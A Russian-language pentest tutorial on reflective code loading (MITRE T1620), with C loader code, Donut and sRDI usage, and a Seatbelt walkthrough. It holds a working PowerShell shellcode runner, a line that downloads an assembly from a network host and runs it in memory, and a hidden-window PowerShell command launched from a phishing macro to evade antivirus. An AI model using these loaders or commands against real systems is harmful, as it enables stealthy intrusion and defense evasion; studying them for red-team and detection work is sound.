# Reflective Loading: выполнение полезной нагрузки в памяти без размещения на диске

## 1. Где проходит граница: Reflective Loading среди техник бесфайлового исполнения

Reflective code loading (отражающая загрузка кода) — техника выполнения вредоносной программы, при которой полезная нагрузка загружается и исполняется непосредственно в виртуальной памяти процесса, минуя файловую систему. В отличие от классических схем, где DLL или EXE должны быть предварительно записаны на диск, а затем подхвачены системным загрузчиком, рефлективная загрузка манипулирует памятью вручную: выделяет область, копирует туда образ PE-файла или позиционно-независимый код, самостоятельно разрешает импорты и релокации, после чего передаёт управление. Такая схема формально остаётся «файловой» лишь на этапе попадания загрузчика в память, но сам исполняемый код нигде не оседает в виде постоянного артефакта. В экосистеме файловых техник reflective loading часто путают с process injection и простым бесфайловым выполнением скриптов. Таблица ниже разграничивает эти понятия.

| Техника / метод | Механизм | Работа с диском | Регистрация в ОС как модуль | Примеры |
|-----------------|----------|-----------------|-----------------------------|---------|
| **Standard LoadLibrary** | Вызов Windows API `LoadLibrary` для DLL, находящейся на диске | Требуется файл на диске | DLL заносится в PEB-список загруженных модулей процесса | Обычная легитимная загрузка |
| **Process Injection** (T1055) | Запись вредоносного кода в адресное пространство *другого* процесса через `VirtualAllocEx`/`WriteProcessMemory` и запуск удалённой нити | Возможно наличие файла на диске или загрузка с сетевого ресурса; часто используется комбинация | Внедрённый код не регистрируется как модуль, но может обнаруживаться по аномальным нитям | Cobalt Strike `shinject`, классический meterpreter-инжект |
| **Reflective Code Loading** (T1620) | Загрузка PE-образа или shellcode в *собственный* процесс без вызова `LoadLibrary`. Все операции по отображению секций, фиксации релокаций и разрешению импортов воспроизводятся вручную. | Полезная нагрузка никогда не попадает на диск; загружается из памяти (например, из массива байт, переданного по сети) | Не вызывает регистрацию в LDR, не появляется в списке модулей процесса (остаётся лишь выделенная память с правами на исполнение) | Cobalt Strike `execute-assembly`, Metasploit `Reflective DLL Injection`, Donut + PowerShell |
| **Shellcode-инъекция в собственном процессе** | Выделение исполняемой памяти (`VirtualAlloc` с `PAGE_EXECUTE_READWRITE`), копирование туда позиционно-независимого блоба, передача управления через `CreateThread` или прямой вызов | Shellcode часто генерируется из полезной нагрузки без использования диска | Аналогично reflective loading: только анонимный регион памяти, отсутствие образа в списке модулей | Пентестерский загрузчик на C, использующий `VirtualAlloc` + `memcpy` + `CreateThread` |

Reflective loading применяется злоумышленниками для обхода антивирусов, ориентированных на сканирование файловой системы, и для уклонения от EDR, которые отслеживают загрузку DLL через `LdrLoadDll`. В пентесте техника помогает имитировать действия продвинутых противников, проверяя способность защиты реагировать на аномалии памяти. Отталкиваясь от MITRE ATT&CK [T1620 Reflective Code Loading](https://attack.mitre.org/techniques/T1620), мы видим, что метод универсален и реализуем на всех трёх основных платформах — Windows, Linux, macOS, хотя каждая ОС накладывает собственные ограничения (например, macOS, начиная с определённых версий, при вызове `NSCreateObjectFileImageFromMemory` записывает образ на диск в скрытую временную директорию [Red Canary](https://redcanary.com/threat-detection-report/techniques/reflective-code-loading)). Базовый контраст между классической загрузкой и отражающей можно показать двумя фрагментами псевдокода:

```c
// классическая загрузка DLL
HMODULE hMod = LoadLibraryW(L"C:\\Windows\\Temp\\evil.dll");
// В PEB процесса появляется запись LDR_DATA_TABLE_ENTRY, файл виден на диске

// отражающая загрузка той же DLL из памяти (схематически)
LPVOID lpBase = VirtualAlloc(NULL, dwImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
CopyMemory(lpBase, pRawDllBytes, dwImageSize);
PerformBaseRelocation(lpBase, delta);
ResolveImports(lpBase);
DllMain(lpBase, DLL_PROCESS_ATTACH, NULL);
// в списке модулей процесса запись не появляется, диск не затронут
```

Таким образом, reflective loading — гибрид автономной загрузки PE и shellcode-рантайма, где ключевым признаком является самостоятельная эмуляция системного загрузчика без участия ОС.

## 2. Анатомия Reflective Loader: от PE-структуры до исполняемого региона памяти

Техническое ядро reflective loading состоит в воспроизведении логики системного загрузчика исполняемых файлов, чтобы разместить образ в памяти и подготовить его к выполнению. Обычно рассматривают два основных сценария: загрузка PE (Portable Executable, Windows) и выполнение позиционно-независимого shellcode.

Для PE-файла (DLL или EXE, скомпилированного как DLL) отражающий загрузчик должен решить три главные задачи:

1. **Выделение памяти и копирование секций** – в соответствии с заголовками PE (`IMAGE_OPTIONAL_HEADER`), резервируется непрерывный блок памяти, куда побайтово копируются все секции (`IMAGE_SECTION_HEADER`) по смещениям, указанным в таблице.
2. **Исправление базовых адресов (base relocation)** – если образ не может быть загружен по предпочитаемому базовому адресу (`ImageBase`), необходимо скорректировать все абсолютные ссылки в коде с учётом фактического базового адреса загрузки. Для этого используется секция `.reloc`, содержащая таблицу исправлений.
3. **Разрешение импортов** – загрузчик проходит по таблице импортов (`IMAGE_IMPORT_DESCRIPTOR`), загружает требуемые системные библиотеки (через честный вызов `LoadLibrary`, только для системных DLL, которые уже есть в системе), и заполняет таблицу адресов импорта (IAT) указателями на реальные функции. Если загрузчик аккуратен, он не вызывает `LoadLibrary` для самого себя, а использует уже загруженный образ kernel32/ntdll, полученный через PEB (Process Environment Block).

После подготовки выполняется вызов `DllMain` с параметром `DLL_PROCESS_ATTACH`, и полезная нагрузка получает управление, полностью находясь в памяти без привязки к файлу.

Ниже представлена упрощённая структура PE-файла в формате иллюстративной схемы полей, важных для загрузчика:

```json
{
  "IMAGE_DOS_HEADER": { "e_magic": "MZ", "e_lfanew": "<смещение до NT-заголовка>" },
  "IMAGE_NT_HEADERS": {
    "Signature": "PE\0\0",
    "FileHeader": { "NumberOfSections": "<число секций>", "SizeOfOptionalHeader": "<размер>" },
    "OptionalHeader": {
      "ImageBase": "<предпочитаемый базовый адрес>",
      "SizeOfImage": "<полный размер образа в памяти>",
      "DataDirectory": [
        { "VirtualAddress": "<RVA таблицы импортов>", "Size": "<...>" },
        { "VirtualAddress": "<RVA .reloc>", "Size": "<...>" }
      ]
    }
  },
  "IMAGE_SECTION_HEADER[]": [
    { "Name": ".text", "VirtualAddress": "<RVA>", "SizeOfRawData": "<...>", "PointerToRawData": "<...>" },
    { "Name": ".rdata", "VirtualAddress": "<RVA>", "SizeOfRawData": "<...>", "PointerToRawData": "<...>" }
  ],
  "RawBytes": "<бинарные данные секций в том же порядке>"
}
```

Реальный reflective loader обычно реализуется на C/ASM и встраивается в начало вредоносного образа как функция, вызываемая самой после копирования в память. Фрагмент, иллюстрирующий цикл копирования секций и обработку релокаций в псевдокоде:

```c
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LPBYTE)rawData + dos->e_lfanew);
LPVOID imageBase = VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
// копируем заголовки
memcpy(imageBase, rawData, nt->OptionalHeader.SizeOfHeaders);
// копируем секции
PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
    if (sec->SizeOfRawData) {
        memcpy((LPBYTE)imageBase + sec->VirtualAddress,
               (LPBYTE)rawData + sec->PointerToRawData, sec->SizeOfRawData);
    }
}
// релокации
ULONG_PTR delta = (ULONG_PTR)imageBase - nt->OptionalHeader.ImageBase;
PIMAGE_DATA_DIRECTORY relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
if (relocDir->Size > 0) {
    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)imageBase + relocDir->VirtualAddress);
    while (reloc->SizeOfBlock) {
        ULONG count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *entry = (WORD*)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
        for (ULONG i = 0; i < count; i++, entry++) {
            if ((*entry >> 12) == IMAGE_REL_BASED_DIR64) {
                *(ULONG_PTR*)((LPBYTE)imageBase + reloc->VirtualAddress + (*entry & 0xFFF)) += delta;
            }
        }
        reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + reloc->SizeOfBlock);
    }
}
// вызов точки входа (подразумевается, что это DllMain)
((BOOL (WINAPI*)(HINSTANCE, DWORD, LPVOID))
    ((LPBYTE)imageBase + nt->OptionalHeader.AddressOfEntryPoint))
    (imageBase, DLL_PROCESS_ATTACH, NULL);
```

В сценарии shellcode (например, сгенерированного утилитой [Donut](https://thewover.github.io/Introducing-Donut/)) загрузчик проще: позиционно-независимый код сам находит нужные API через хеши имён или обход PEB, поэтому отпадает необходимость в ручной обработке импортов. Такой shellcode обычно релоцируем и не зависит от адреса, поэтому загрузка сводится к `VirtualAlloc` → копирование → вызов.

Схематично весь процесс загрузки PE-файла в память выглядит так:

```text
[raw PE bytes]
      │
      ▼
VirtualAlloc(SizeOfImage)   ── выделение региона памяти
      │
      ▼
Копирование заголовков и секций
      │
      ▼
Обработка .reloc (коррекция адресов под фактический ImageBase)
      │
      ▼
Разрешение импортов (заполнение IAT через LoadLibrary + GetProcAddress)
      │
      ▼
Вызов DllMain ── начало выполнения полезной нагрузки в памяти
      │
      ▼
[процесс работает с полезной нагрузкой, не касаясь диска]
```

На этом этапе важно подчеркнуть, что современные реализации могут избегать выделения памяти с правами `RWX` (чтение-запись-исполнение), чтобы не вызывать подозрений у EDR. Вместо этого применяют схему: выделение `RW`, запись, смена защиты на `RX` перед запуском. Но классические loader’ы для простоты используют `RWX`.

## 3. Арсенал пентестера: инструменты и тактики практического применения

В реальной практике пентеста reflective loading применяется в первую очередь для скрытной доставки постэксплуатационных инструментов — от разведчиков вроде Seatbelt до полноценных агентов Cobalt Strike и Meterpreter. Ниже перечислены ключевые инструменты и фреймворки с указанием их роли.

- **Cobalt Strike `execute-assembly`** – загружает произвольную .NET-сборку в память процесса-жертвы без касания диска, используя fork&run или inline-выполнение. Технически создаётся временный процесс (по умолчанию `rundll32.exe`), в который через reflective DLL injection внедряется загрузчик CLR, а затем в него же маппится .NET-сборка. С версии 4.5 применяется BOF (Beacon Object Files) для минимизации артефактов. [MITRE](https://attack.mitre.org/techniques/T1620) относит `execute-assembly` к T1620.
- **Donut** – генератор позиционно-независимого shellcode из .NET-сборок, скриптов VBS/JS/XSL. Полученный shellcode инкапсулирует мини-загрузчик, который распаковывает сборку, загружает CLR и исполняет её в памяти. Может использоваться в паре с любым дрючером.
- **sRDI (Shellcode Reflective DLL Injection)** [GitHub monoxgas/sRDI](https://github.com/monoxgas/sRDI) – конвертирует произвольную DLL в shellcode, который при выполнении сам себя загружает в память аналогично reflective loader. Широко применяется в red teaming, был замечен в атаке на цепочку поставок 3CX (кампания C0057).
- **PowerShell с `Assembly.Load`** – классический пример бесфайловой загрузки .NET-кода. Сборка в виде массива байт (например, полученного по сети) загружается через `System.Reflection.Assembly.Load(byte[])`, после чего могут вызываться её методы, всё в памяти. Этот метод упоминается MITRE в описании T1620.

Практическое применение Donut для пентеста:

```bash
# Генерация shellcode из .NET-сборки Seatbelt.exe (архитектура x64, файловый формат bin)
donut -f 1 -a 2 -o seatbelt.bin Seatbelt.exe
# На выходе seatbelt.bin — позиционно-независимый shellcode, готовый для загрузчика
```

Полученный shellcode может быть вставлен в C-загрузчик или PowerShell. Пример загрузки через PowerShell с использованием WinAPI-вызовов (через Add-Type с C# code или уже имеющийся сниппет):

```powershell
$shellcode = [System.Convert]::FromBase64String("...") # base64 от seatbelt.bin
$kernel32 = Add-Type -Name 'k32' -Namespace 'WinAPI' -PassThru -Debug:$false -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
'@
$size = $shellcode.Length
$addr = [WinAPI.k32]::VirtualAlloc(0, $size, 0x3000, 0x40) # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
$thread = [WinAPI.k32]::CreateThread(0, 0, $addr, 0, 0, 0)
[WinAPI.k32]::WaitForSingleObject($thread, 0xFFFFFFFF) | Out-Null
```

В этом примере полностью исключено касание диска исполняемой сборкой: shellcode загружается в память PowerShell, выделяется исполняемый регион, и управление передаётся на загрузчик, встроенный Donut’ом.

Важный нюанс: при использовании `Assembly.Load` в PowerShell для загрузки .NET-сборки напрямую (без Donut) также происходит reflective loading, но уже в контексте .NET Framework. Этот метод менее скрытен, так как загруженная сборка отражается в кеше .NET и может быть обнаружена профилировщиками, однако диск остаётся чистым:

```powershell
$bytes = (Invoke-WebRequest -Uri "http://192.168.1.100/Seatbelt.exe").Content;
[System.Reflection.Assembly]::Load($bytes);
[Seatbelt.Program]::Main(@("user","all"));
```

Среди типичных ошибок пентестеров — игнорирование архитектуры (x86 против x64), попытка выполнить shellcode x86 в процессе x64 без переключения режима, что приводит к крашу. Другая распространённая ловушка — использование регионов `RWX`, которые EDR ценят как высокий индикатор подозрительности. Современные loader-реализации после копирования shellcode и фиксации импортов меняют защиту на `PAGE_EXECUTE_READ`, сокращая время жизни записываемой-исполняемой памяти.

## 4. Сквозной практический пример: неслышный запуск .NET-сборки Seatbelt через reflective loading в Windows

**Исходные условия:**  
ОС: Windows 10 x64, включённый Microsoft Defender (в стандартной конфигурации), EDR отсутствует. Пентестер уже получил доступ к системе через фишинговый документ, и его задача — собрать информацию о системе с помощью Seatbelt, не оставляя файла на диске и не вызывая подозрений файлового антивируса. Инструменты: Donut, C2-фреймворк или автономный PowerShell, целевой хост с разрешёнными исходящими HTTP-запросами (если доставлять через загрузку по сети).

**Шаг 1. Генерация shellcode из .NET-сборки**  
На машине пентестера компилируем Seatbelt.exe (или берём готовый) и запускаем Donut для получения позиционно-независимого блоба.

```bash
# Клонируем репозиторий Donut и собираем
git clone https://github.com/TheWover/donut.git && cd donut
make
# Генерируем бинарный shellcode (архитектура x64, класс .NET)
./donut -f 1 -a 2 -o /tmp/seatbelt.bin Seatbelt.exe
```

Флаг `-f 1` задаёт формат вывода «raw binary», `-a 2` — архитектура x64. Полученный `seatbelt.bin` содержит встроенный загрузчик CLR и параметры для запуска.

**Шаг 2. Подготовка PowerShell-загрузчика**  
Кодируем `seatbelt.bin` в base64 и встраиваем в скрипт. Для доставки предполагаем использование PowerShell одной строкой, вызываемой из документа-приманки. Скрипт загружает shellcode в память и запускает его.

```powershell
$s = @'
<BASE64_OT_SEATBELT>
'@
$bytes = [System.Convert]::FromBase64String($s)
$k32 = Add-Type -Name 'K32' -Namespace 'W' -PassThru -MemberDefinition @'
[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr tA, uint sS, IntPtr sA, IntPtr p, uint cF, IntPtr tId);
[DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
'@
$addr = [W.K32]::VirtualAlloc(0, $bytes.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
$hThread = [W.K32]::CreateThread(0, 0, $addr, 0, 0, 0)
[W.K32]::WaitForSingleObject($hThread, 0xFFFFFFFF) | Out-Null
```

**Шаг 3. Выполнение на цели**  
Оператор доставляет PowerShell-команду через фишинговый макрос, используя обёртку `powershell -nop -w hidden -c "..."`. PowerShell работает в памяти: после вызова `VirtualAlloc` появляется анонимный регион размером ~2,5 МБ с правами `PAGE_EXECUTE_READWRITE`. В него копируется shellcode, затем запускается нить. Donut внутри себя инициализирует CLR, загружает сборку Seatbelt и выполняет `Main`. В течение нескольких секунд Seatbelt собирает информацию и отправляет результат по сети (если настроен канал C2) или выводит в консоль (в скрытом окне не видно, но для демонстрации можно заменить стандартный вывод на запись в альтернативный канал).

В это время файл на диске отсутствует: ни исходный Seatbelt.exe, ни промежуточный DLL, ни временные файлы. Defender, основанный на сигнатурах файлов, не реагирует, так как сканировать нечего. Однако при включённом AMSI и Script Block Logging PowerShell-скрипт мог бы быть перехвачен — но в нашем примере доставка происходит через обфусцированную команду и обход AMSI (выходит за рамки примера). В практическом пентесте обход AMSI и отключение логирования является частью обфускации.

**Шаг 4. Проверка артефактов в памяти (демонстрация отсутствия файлов, но наличия аномального региона)**  
Используя Process Hacker на тестовой системе, мы видим процесс `powershell.exe`, внутри которого выделен приватный регион памяти с правами `RWX` (или `RX` после смены защиты) размером 2,5 МБ, содержащий бинарные данные. В списке модулей (DLL) процесса отсутствуют посторонние библиотеки, загруженные через `LoadLibrary`. Приостановка процесса и анализ дампа региона подтверждает наличие PE-заголовка Donut и сборки.

```text
Process: powershell.exe (PID 4560)
  Private Memory Region:
    Address: 0x000001E2B5A00000, Size: 2,621,440 bytes
    Protection: RWX (0x40)
    State: MEM_COMMIT
    Type: PRIVATE
```

Это классический индикатор reflective loading: регион с правами на исполнение, не связанный ни с одним образом на диске.

**Ожидаемый вывод по теме:** пример показывает полный цикл бесфайлового выполнения пост-эксплуатационного инструмента: генерация позиционно-независимого кода, его загрузка в память без касания диска, обход файловых антивирусных сигнатур и оставление минимальных следов, сосредоточенных исключительно в оперативной памяти.

## Источники

- [MITRE ATT&CK T1620 Reflective Code Loading](https://attack.mitre.org/techniques/T1620)
- [Red Canary Threat Detection Report – Reflective Code Loading (macOS)](https://redcanary.com/threat-detection-report/techniques/reflective-code-loading)
- [Trend Micro – Netwalker Fileless Ransomware Injected via Reflective Loading](https://www.trendmicro.com/en_us/research/20/e/netwalker-fileless-ransomware-injected-via-reflective-loading.html)
- [TrustedSec – Loading DLLs Reflections](https://trustedsec.com/blog/loading-dlls-reflections)
- [TheWover – Donut: Position-Independent Code for .NET Assemblies](https://thewover.github.io/Introducing-Donut/)
- [sRDI (Shellcode Reflective DLL Injection) – monoxgas](https://github.com/monoxgas/sRDI)
- [Microsoft – Assembly.Load Method](https://learn.microsoft.com/dotnet/api/system.reflection.assembly.load)
- [GTK Cyber – T1620 Reflective Code Loading](https://gtkcyber.com/mitre/T1620)